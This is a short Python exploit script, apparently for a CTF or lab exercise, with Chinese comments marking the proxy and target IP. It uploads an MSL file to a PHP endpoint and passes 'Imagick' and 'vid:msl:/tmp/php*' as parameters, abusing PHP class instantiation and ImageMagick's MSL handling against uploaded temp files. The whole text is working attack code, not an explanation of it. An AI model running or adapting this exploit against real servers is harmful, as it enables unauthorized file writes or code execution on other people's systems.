import requests

proxy={'http':'http://192.168.101.3:7890','https':'http://192.168.101.3:7890'} #代理


url='http://192.168.126.129:7888/index.php?time=1&&a=Imagick&&b=vid:msl:/tmp/php*'#目标ip

file={'file': ('1.msl', open('1.msl', 'rb'), 'application/x-www-form-urlencoded', {'Expires': '0'})}

requests.post(url,files=file,proxies=proxy)


